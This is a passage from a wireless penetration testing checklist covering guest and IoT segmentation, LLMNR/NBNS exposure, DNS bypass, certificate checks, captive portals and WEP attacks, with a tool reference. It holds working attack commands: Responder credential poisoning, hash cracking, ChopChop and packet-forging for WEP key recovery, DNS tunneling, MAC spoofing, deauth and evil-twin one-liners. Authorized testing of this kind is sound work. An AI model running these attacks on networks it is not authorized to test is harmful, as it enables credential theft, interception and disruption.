# Rate limiting test
for i in {1..20}; do
  curl -s -o /dev/null -d "user=admin&pass=wrong$i" http://<portal_IP>/login
done
```

**What to Look For:**
- HTTP (unencrypted) portal
- MAC-based bypass
- SQL injection; XSS; missing CSRF protection
- No session invalidation on logout; no rate limiting

**Pass Criteria:** HTTPS only; input validation; CSRF tokens; proper session management; rate limiting.  
**Fail Criteria:** Any bypass method works; web vulnerabilities present.

**Evidence:** Screenshot of successful bypass; `sqlmap` output; session token reuse test result.

**Remediation:** Enforce HTTPS; implement web security controls; use 802.1X; proper session lifecycle management.

---

## 24. Guest-to-Corporate Segmentation

**Finding:** Guest-to-Corporate Segmentation — Internal Network  
**Objective:** Verify that guest users cannot reach corporate resources.

**Step-by-Step Procedure:**
1. Connect to guest SSID and complete captive portal authentication.
2. Record assigned IP, subnet, gateway, and DNS.
3. Probe all known corporate subnets.
4. Test IPv6 bypass.
5. Test VLAN hopping.

**Commands:**

```bash
ip addr show wlan0
ip route show

nmap -sn <corporate_subnet_1/24>
nmap -sn <corporate_subnet_2/24>
arp-scan -l --interface wlan0

nmap -p 80,443,445,3389,22 <corporate_server_IP>
curl http://<corporate_intranet>/
smbclient -L \\<corporate_fileserver>\ -N

# IPv6 bypass
ip -6 addr show
nmap -6 -sn <corporate_ipv6_prefix>::/64

# VLAN hopping (requires authorization)
sudo yersinia -I
```

**Pass Criteria:** All corporate resources unreachable from guest WLAN; IPv6 also blocked.  
**Fail Criteria:** Any corporate resource reachable from guest WLAN via any protocol.

**Evidence:** `nmap` output; any successful cross-segment connections (critical finding).

**Remediation:** Dedicated guest VLAN; firewall default-deny; block VLAN hopping; apply IPv6 ACLs; enable RA Guard.

---

## 25. IoT Network Pivot Assessment

**Finding:** IoT Network Pivot Assessment — IoT SSID  
**Objective:** Confirm IoT devices cannot access sensitive business systems.

**Step-by-Step Procedure:**
1. Connect to IoT SSID (simulating a compromised IoT device).
2. Enumerate accessible network segments.
3. Probe corporate and server subnets.
4. Check IoT-specific protocols.
5. Attempt to pivot to corporate resources.

**Commands:**

```bash
wpa_passphrase <IoT_SSID> <psk> > /tmp/iot.conf
sudo wpa_supplicant -c /tmp/iot.conf -i wlan0
ip addr show wlan0

nmap -sn <corporate_subnet/24>
nmap -sn <server_subnet/24>
nmap -sn <management_subnet/24>

# IoT protocol checks
mosquitto_sub -h <broker_IP> -t "#" -v   # MQTT
coap-client -m get coap://<target_IP>/.well-known/core   # CoAP

# Pivot attempt
nmap -p- --open <corporate_host>
```

**Pass Criteria:** IoT SSID completely isolated; only whitelisted IoT cloud services reachable.  
**Fail Criteria:** Corporate, server, or management resources reachable from IoT SSID.

**Evidence:** `nmap` output showing isolation; any successful cross-segment connections.

**Remediation:** Dedicated VLAN per IoT category; whitelist-only outbound; east-west microsegmentation; monitor IoT traffic.

---

## 26. LLMNR / NBNS Exposure

**Finding:** LLMNR / NBNS Exposure — Windows Clients  
**Objective:** Identify unnecessary name-resolution broadcasts that expose internal information.

**Step-by-Step Procedure:**
1. Connect to the wireless network.
2. Passively capture LLMNR and NetBIOS Name Service (NBNS) broadcasts.
3. Use Responder to poison name resolution and capture credentials.

**Commands:**

```bash
# Passive LLMNR/NBNS capture
sudo tshark -i wlan0 -Y "llmnr or nbns" \
  -T fields -e frame.time -e ip.src -e llmnr.qry.name -e nbns.name

# mDNS
sudo tshark -i wlan0 -Y "mdns" -T fields -e ip.src -e dns.qry.name

# Responder to capture credentials (only if authorized)
sudo responder -I wlan0 -rdwv

# Crack captured NTLMv2 hashes
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt
```

**What to Look For:**
- LLMNR/NBNS queries broadcasting internal hostname lookups
- NTLMv2 hashes captured by Responder
- Username and domain information in NBNS traffic

**Pass Criteria:** LLMNR/NBNS disabled on all wireless clients; no NTLMv2 hashes capturable.  
**Fail Criteria:** LLMNR/NBNS traffic observed; NTLMv2 hashes captured.

**Evidence:** tshark output showing LLMNR/NBNS queries; Responder log showing captured hashes (redact values).

**Remediation:**
- Disable LLMNR via Group Policy: `Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution`
- Disable NetBIOS over TCP/IP via DHCP option 43 or NIC properties

---

## 27. DNS Policy Bypass

**Finding:** DNS Policy Bypass — Guest Wi-Fi  
**Objective:** Verify whether organizational DNS policies can be bypassed.

**Step-by-Step Procedure:**
1. Connect to guest SSID; note assigned DNS.
2. Test DNS policy enforcement.
3. Attempt to use alternative DNS resolvers.
4. Test DNS-over-HTTPS (DoH) bypass.
5. Test DNS tunneling.

**Commands:**

```bash
cat /etc/resolv.conf

# Test policy enforcement
dig @<assigned_DNS> blocked-category-site.com   # Should return NXDOMAIN

# Try alternative DNS resolvers (should be blocked by firewall)
dig @8.8.8.8 blocked-category-site.com
dig @1.1.1.1 blocked-category-site.com
nmap -sU -p 53 8.8.8.8   # Should show filtered

# DNS-over-HTTPS bypass
curl -H 'accept: application/dns-json' \
  'https://cloudflare-dns.com/dns-query?name=blocked-site.com&type=A'

# DNS tunneling bypass
sudo iodined -f -c -P <password> 10.0.0.1 tunnel.<your_domain>   # server-side
sudo iodine -f -P <password> <your_server_IP> tunnel.<your_domain>   # client-side
```

**Pass Criteria:** All DNS queries forced through policy-enforced resolver; external DNS blocked; DoH and DNS tunneling blocked.  
**Fail Criteria:** External DNS resolver accessible; content filter bypassable; DNS tunneling possible.

**Evidence:** `dig` output showing successful resolution via external DNS; DNS tunneling connectivity proof.

**Remediation:** Block outbound UDP/TCP 53 to all IPs except authorized DNS resolvers; block DoH endpoints; inspect DNS at proxy/gateway level.

---

## 28. RF Coverage Assessment

**Finding:** RF Coverage Assessment — Physical Environment  
**Objective:** Measure whether wireless coverage extends beyond intended boundaries.

**Step-by-Step Procedure:**
1. Create a site map of the facility.
2. Walk the perimeter of the building with Wi-Fi scanning tools.
3. Record signal strength at key points (parking lots, adjacent buildings, streets).
4. Map signal strength against building boundaries.
5. Identify areas of excessive signal propagation.

**Commands:**

```bash
# Walk perimeter while running airodump-ng
sudo airodump-ng --bssid <BSSID> -c <channel> wlan0mon --write rf_survey --output-format csv

# airodump-ng PWR column (dBm scale):
# -30 = very strong | -70 = threshold | -90 = weak
# > -70 dBm outside building = excessive coverage

# GPS-based survey with Kismet
sudo kismet -c wlan0mon   # Enable GPS module in Kismet config

# macOS: Wireless Diagnostics > Wi-Fi Scan
# Windows: NetSpot App (GUI heatmap)
```

**What to Look For:**
- Signal > -70 dBm in parking lots, streets, or adjacent buildings
- Corporate SSID accessible from neighboring tenant spaces

**Pass Criteria:** Signal <= -70 dBm at building perimeter; corporate SSID undetectable from adjacent properties.  
**Fail Criteria:** Strong signal (> -70 dBm) detected outside intended coverage area.

**Evidence to Capture:**
- RF heat map or table of GPS coordinates with signal strengths
- Photographs of testing locations
- `airodump-ng` signal strength screenshots at perimeter locations

**Remediation:**
- Reduce AP transmit power to minimum required for coverage
- Use directional antennas aimed inward
- Implement automatic power control (802.11h TPC)
- Apply RF-absorbing materials to exterior walls/windows
- Conduct annual RF coverage surveys

---

## 29. Certificate Lifecycle Review (EAP-TLS)

**Finding:** Certificate Lifecycle Review EAP-TLS  
**Objective:** Confirm expired or revoked certificates are no longer accepted.

**Step-by-Step Procedure:**
1. Obtain or generate an expired client certificate.
2. Attempt 802.1X EAP-TLS authentication with the expired certificate.
3. Attempt authentication with a revoked certificate.
4. Review RADIUS server and CA certificate expiry.

**Commands:**

```bash
# Check certificate expiry dates
openssl x509 -in client_cert.pem -noout -dates

# Generate test expired certificate (lab only)
openssl req -x509 -newkey rsa:2048 -keyout test_key.pem -out test_cert.pem \
  -days -1 -subj "/CN=ExpiredTest"   # already expired

# Configure wpa_supplicant with expired cert and attempt auth
cat > /tmp/expired_eap.conf << 'EOF'
network={
    ssid="<CORPORATE_SSID>"
    key_mgmt=WPA-EAP
    eap=TLS
    identity="test@corporate.com"
    client_cert="/tmp/test_cert.pem"
    private_key="/tmp/test_key.pem"
    ca_cert="/path/to/ca.crt"
}
EOF
sudo wpa_supplicant -c /tmp/expired_eap.conf -i wlan0

# Check RADIUS cert expiry
openssl s_client -connect <RADIUS_IP>:1812 2>/dev/null | openssl x509 -noout -dates

# Check CA cert expiry
openssl x509 -in ca_cert.pem -noout -dates
```

**What to Look For:**
- Expired certificate accepted by RADIUS server
- Revoked certificate accepted (CRL/OCSP not checked)
- Certificates close to expiry

**Pass Criteria:** Expired certificates rejected; revoked certificates rejected; all certificates >= 30 days from expiry.  
**Fail Criteria:** Expired or revoked certificate accepted for authentication.

**Evidence to Capture:**
- RADIUS server log showing acceptance/rejection of expired certificate
- `wpa_supplicant` output showing authentication result
- Certificate expiry dates table

**Remediation:**
- Configure RADIUS to enforce certificate validity dates
- Enable CRL/OCSP checking on RADIUS server
- Implement certificate lifecycle management (alerts 60 days before expiry)
- Automate certificate renewal via SCEP or ACME
- Maintain a certificate inventory with expiry tracking

---

## 30. Guest Session Persistence

**Finding:** Guest Session Persistence — Review Captive Portal  
**Objective:** Verify sessions expire appropriately after logout or inactivity.

**Step-by-Step Procedure:**
1. Connect to guest SSID and authenticate via captive portal.
2. Capture the session token/cookie.
3. Log out and attempt to reuse the session token.
4. Measure inactivity timeout.
5. Test MAC-based session reuse.

**Commands:**

```bash
# Authenticate via captive portal using browser with Burp Suite proxy

# Capture session token (observe Set-Cookie header in Burp Suite)

# Test post-logout reuse
curl -b "session=<captured_cookie>" http://captive.portal.ip/success
# Or replay in Burp Suite Repeater

# Inactivity timeout: stop all traffic for 5/10/15/30 minutes, then browse
# Note when internet access is denied

# MAC-based session persistence bypass
sudo macchanger -m <prev_authenticated_MAC> wlan0
# Reconnect to SSID — does internet access work without re-authentication?
```

**What to Look For:**
- Session token valid after logout (no server-side invalidation)
- No inactivity timeout
- MAC-based session allows bypass after initial auth

**Pass Criteria:** Session invalidated on logout; inactivity timeout <= 4 hours; MAC change requires re-authentication.  
**Fail Criteria:** Session token valid after logout; no inactivity timeout; MAC bypass works.

**Evidence to Capture:**
- Burp Suite screenshot showing session reuse after logout
- Timeline of inactivity timeout behavior
- MAC-based bypass screenshot

**Remediation:**
- Implement server-side session invalidation on logout
- Configure inactivity timeout (<= 4 hours for guest)
- Use cryptographically random, non-guessable session tokens (>= 128 bits)
- Avoid pure MAC-based session persistence

---

## 31. KoreK ChopChop Attack

**Finding:** Test for KoreK ChopChop Attack  
**Objective:** Demonstrate that the KoreK ChopChop attack can generate a PRGA file from a WEP packet without knowing the key.

**Overview:** The KoreK ChopChop attack guesses the last byte of a captured WEP packet's plaintext one byte at a time. The AP's accept/reject response reveals correct guesses, eventually decrypting the entire packet. The derived PRGA/keystream can then be used to encrypt forged packets.

**Step-by-Step Procedure:**
1. Enable monitor mode.
2. Lock to target WEP AP and capture at least one data frame.
3. Run ChopChop attack to derive keystream.
4. Use `packetforge-ng` to forge an ARP packet.
5. Inject forged ARP to generate IVs for WEP cracking.

**Commands:**

```bash
# Step 1: Enable monitor mode
sudo airmon-ng start wlan0

# Step 2: Lock to WEP AP
sudo airodump-ng --bssid <AP_MAC> -c <channel> -w chopchop_cap wlan0mon

# Step 3: Run KoreK ChopChop
sudo aireplay-ng -4 -b <AP_MAC> -h <Source_MAC> <interface>
# Flags:
# -4: the chopchop attack
# -b: the AP MAC address
# -h: the source (probably your) MAC address
# <interface>: the monitor mode interface (wlan0mon)
# Output: replay_dec-XXXX-XXXXXX.xor (PRGA/keystream file)

# Step 4: Verify PRGA file generated
ls -la replay_dec-*.xor

# Step 5: Forge ARP packet using PRGA
sudo packetforge-ng -0 -a <AP_MAC> -h <Your_MAC> \
  -k 255.255.255.255 -l 255.255.255.255 \
  -y replay_dec-<timestamp>.xor -w forged_arp.cap
# Flags:
# -0: generate an ARP request packet
# -a: the AP MAC address
# -h: the source (usually yours) MAC address
# -k: the destination IP (255.255.255.255 if unknown)
# -l: the source IP (255.255.255.255 if unknown)
# -y: the PRGA/XOR filename (from chopchop output)
# -w: the filename to save the packet to

# Note 1: if IP addresses are unknown, use 255.255.255.255 for both -k and -l
# Note 2: above command generates ARP packet; ICMP, NULL etc. packets can also be generated

# Step 6: Inject forged packet
sudo aireplay-ng -2 -r forged_arp.cap wlan0mon

# Step 7: Crack WEP key when #Data > 50,000
aircrack-ng chopchop_cap-01.cap
```

**What to Look For:**
- `aireplay-ng -4` output: `Attack was successful!`
- Generated `.xor` keystream file
- `aircrack-ng` output: `KEY FOUND!`

**Pass Criteria:** N/A — Any WEP network is a critical vulnerability regardless of attack success.  
**Fail Criteria:** WEP in use — unconditional FAIL.

**Evidence to Capture:**
- `aireplay-ng -4` terminal output showing successful ChopChop execution
- `.xor` file generated (confirm with `ls`)
- `packetforge-ng` output showing forged packet creation
- `aircrack-ng` KEY FOUND output

**Remediation:** Replace WEP with WPA3-SAE or WPA2-CCMP immediately. WEP is cryptographically broken and provides no meaningful security.

---

## 32. Packet Injection

**Finding:** Test for Packet Injection  
**Objective:** Verify that wireless frames can be injected into the network using a forged packet created from a PRGA/XOR keystream file.

**Overview:** `packetforge-ng` creates encrypted packets that can be injected into the network. The encrypted packet is crafted using a PRGA (keystream) file obtained from a ChopChop (`aireplay-ng -4`) or Fragmentation (`aireplay-ng -5`) attack. Packet injection demonstrates an attacker can manufacture arbitrary network traffic.

**Step-by-Step Procedure:**
1. Obtain a PRGA/XOR file from ChopChop or Fragmentation attack.
2. Use `packetforge-ng` to create an encrypted ARP or ICMP packet.
3. Inject the forged packet using `aireplay-ng`.
4. Monitor the IV counter in `airodump-ng` to verify injection success.

**Commands:**

```bash
# Step 1: Obtain PRGA file
# Method A: Fragmentation attack
sudo aireplay-ng -5 -b <AP_MAC> -h <Your_MAC> wlan0mon
# Output: fragment-XXXX-XXXXXX.xor

# Method B: ChopChop attack (see section 31)
sudo aireplay-ng -4 -b <AP_MAC> -h <Your_MAC> wlan0mon
# Output: replay_dec-XXXX-XXXXXX.xor

# Step 2: Forge packet with packetforge-ng
sudo packetforge-ng -0 -a <AP_MAC> -h <Your_MAC> \
  -k <Dest_IP> -l <Source_IP> \
  -y <xor_filename>.xor -w forged_arp.cap

# Flags explained:
# -0: generate an ARP request packet
# -a: the AP MAC address
# -h: the source (usually yours) MAC address
# -k: the destination IP i.e. in ARP, this is "Who has this IP"
# -l: the source IP i.e. in ARP, this is "Tell this IP"
# -y: the PRGA filename (from chopchop or fragmentation attack)
# -w: the filename to save the packet to

# Note 1: if IP addresses are unknown, use 255.255.255.255 for both -k and -l
# Note 2: above command generates ARP packet; ICMP, NULL etc. packets can also be generated

# Step 3: Verify forged packet
tcpdump -n -e -s 0 -r forged_arp.cap | head -20

# Step 4: Inject the forged packet
sudo aireplay-ng -2 -r forged_arp.cap wlan0mon

# Step 5: Monitor IV count in airodump-ng (#Data column should increase rapidly)
sudo airodump-ng --bssid <AP_MAC> -c <channel> wlan0mon

# Step 6: Crack WEP key
aircrack-ng -b <AP_MAC> *.cap
```

**What to Look For:**
- `aireplay-ng -2` output: `Sent XXXX packets...`
- `airodump-ng` `#Data` column rapidly incrementing (successful injection confirmed)
- `aircrack-ng` output: `KEY FOUND! [xx:xx:xx:xx:xx]`

**Pass Criteria:** N/A — Any WEP network is a critical vulnerability. Successful packet injection confirms network is fully compromised.  
**Fail Criteria:** Packet injection succeeds — indicates WEP in use and network is compromised.

**Evidence to Capture:**
- `packetforge-ng` command and output showing forged packet creation
- `aireplay-ng -2` output showing packets sent
- `airodump-ng` screenshot showing rapid IV count increase
- `aircrack-ng` KEY FOUND output

**Remediation:** Replace WEP with WPA3-SAE or WPA2-CCMP immediately. Packet injection into WEP networks is trivial and demonstrates complete loss of confidentiality and integrity.

---

## Appendix A: Tool & Command Quick Reference

| Purpose | Tool | Example Command |
|---|---|---|
| Monitor mode / packet capture | airmon-ng | `airmon-ng start wlan0` |
| SSID/BSSID/channel discovery | airodump-ng | `airodump-ng wlan0mon` |
| Wireless discovery (GUI) | Kismet | `kismet -c wlan0mon` |
| Handshake capture / deauth | aireplay-ng | `aireplay-ng --deauth 10 -a <BSSID> -c <client_MAC> wlan0mon` |
| Handshake / WEP cracking | aircrack-ng | `aircrack-ng -w wordlist.txt capture.cap` |
| PMKID capture | hcxdumptool | `hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1` |
| Hash conversion for hashcat | hcxpcapngtool | `hcxpcapngtool -o hash.22000 capture.cap` |
| GPU-based PSK cracking | hashcat | `hashcat -m 22000 hash.22000 rockyou.txt` |
| WPS PIN attack | reaver | `reaver -i wlan0mon -b <BSSID> -c <channel> -vv` |
| WPS Pixie Dust | bully / reaver -K | `bully -b <BSSID> -c <channel> -d` |
| WPS scan | wash | `wash -i wlan0mon` |
| Rogue AP / evil twin | airbase-ng | `airbase-ng -e "<SSID>" -c <channel> wlan0mon` |
| Karma/MANA attack | hostapd-mana | `hostapd-mana mana.conf` |
| Rogue RADIUS / EAP creds | hostapd-wpe | `hostapd-wpe hostapd-wpe.conf` |
| MSCHAPv2 cracking | asleap / hashcat -m 5500 | `asleap -C <challenge> -R <response> -W wordlist.txt` |
| Host discovery / port scan | nmap | `nmap -sn 192.168.1.0/24` |
| MITM / traffic interception | bettercap | `bettercap -iface wlan0` |
| ARP/DHCP spoofing | Ettercap | `ettercap -T -M arp:remote /<gateway>/ /<target>/` |
| DNS spoofing | bettercap dns.spoof | `set dns.spoof.domains <domain>; dns.spoof on` |
| SNMP enumeration | snmpwalk / onesixtyone | `snmpwalk -v2c -c public <target>` |
| MAC spoofing (NAC bypass) | macchanger | `macchanger -m 00:11:22:33:44:55 wlan0` |
| Firewall/ACL probing | hping3 | `hping3 --syn -p 443 <target>` |
| Packet analysis | Wireshark / tshark | `tshark -i wlan0mon -Y "eapol"` |
| IPv6 recon | nmap -6 / rdisc6 | `nmap -6 -sn <ipv6_range>` |
| Fake authentication | aireplay-ng -1 | `aireplay-ng -1 0 -a <BSSID> -h <YOUR_MAC> wlan0mon` |
| ChopChop attack | aireplay-ng -4 | `aireplay-ng -4 -b <AP_MAC> -h <Source_MAC> wlan0mon` |
| Fragmentation attack | aireplay-ng -5 | `aireplay-ng -5 -b <AP_MAC> -h <YOUR_MAC> wlan0mon` |
| Forge packets | packetforge-ng | `packetforge-ng -0 -a <AP_MAC> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y keystream.xor -w forged.cap` |
| Wordlist generation | crunch | `crunch 8 12 abcdef0123 -o wordlist.txt` |
| PSK pre-computation | genpmk | `genpmk -f rockyou.txt -d pmk.db -s <SSID>` |
| LEAP credential cracking | asleap | `asleap -r capture.cap -W rockyou.txt` |
| DoS / flooding | mdk4 | `mdk4 wlan0mon d -B <BSSID>` |
| DNS tunneling | iodine | `iodine -f -P <pass> <server_IP> tunnel.domain.com` |
| LLMNR poisoning | Responder | `responder -I wlan0 -rdwv` |
| KRACK test | krackattacks-scripts | `python krack-test-client.py` |

---

## Appendix B: Finding Severity Reference

| Finding | Severity |
|---|---|
| WEP in use | Critical |
| WPA-TKIP only | High |
| WPS enabled and attackable | High |
| PSK cracked | High |
| Default credentials on AP/controller | High |
| Open corporate WLAN | Critical |
| Guest-to-corporate access | Critical |
| LEAP in use | High |
| Missing certificate validation (EAP) | High |
| Rogue AP detected | Critical |
| HTTP management enabled | High |
| Telnet enabled | High |
| SNMPv1/v2c with default community | High |
| No Management Frame Protection | Medium |
| TKIP enabled alongside CCMP | Medium |
| Excessive RF coverage | Medium |
| Missing client isolation (guest) | Medium |
| No WIDS/WIPS | High |
| Outdated firmware | Medium-High |
| Missing MFA on management | High |
| LLMNR/NBNS enabled | Medium |
| DNS policy bypass | Medium |
| No session timeout (captive portal) | Medium |
| PNL exposure | Low-Medium |
| Excessive admin privileges | Medium |

---

*Document Version: 1.0*  
*Generated from: Wireless (WiFi) Penetration Testing_Checklist v1.0.xlsx*  
*Classification: RESTRICTED — For authorized security testing use only*
